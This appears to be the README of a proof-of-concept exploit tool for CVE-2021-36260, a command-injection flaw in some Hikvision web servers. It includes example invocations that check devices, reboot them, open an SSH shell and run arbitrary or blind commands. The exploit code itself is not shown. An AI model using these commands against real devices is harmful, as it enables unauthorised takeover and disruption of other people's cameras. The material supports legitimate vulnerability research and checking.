# CVE-2021-36260
CVE-2021-36260 POC command injection vulnerability in the web server of some Hikvision product. Due to the insufficient input validation, attacker can exploit the vulnerability to launch a command injection attack by sending some messages with malicious commands.

Exploit Title: Hikvision Web Server Build 210702 - Command Injection

Exploit Author: bashis

Vendor Homepage: https://www.hikvision.com/

Version: 1.0

CVE: CVE-2021-36260

Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html

# All credit to Watchful_IP


Note:
1)  This code will _not_ verify if remote is Hikvision device or not.
2)  Most of my interest in this code has been concentrated on how to
    reliably detect vulnerable and/or exploitable devices.
    Some devices are easy to detect, verify and exploit the vulnerability,
    other devices may be vulnerable but not so easy to verify and exploit.
    I think the combined verification code should have very high accuracy.
3)  'safe check' (--check) will try write and read for verification
    'unsafe check' (--reboot) will try reboot the device for verification

[Examples]
Safe vulnerability/verify check:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check

Safe and unsafe vulnerability/verify check:
(will only use 'unsafe check' if not verified with 'safe check')
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot

Unsafe vulnerability/verify check:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot

Launch and connect to SSH shell:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell

Execute command:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd "ls -l"

Execute blind command:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind "reboot"

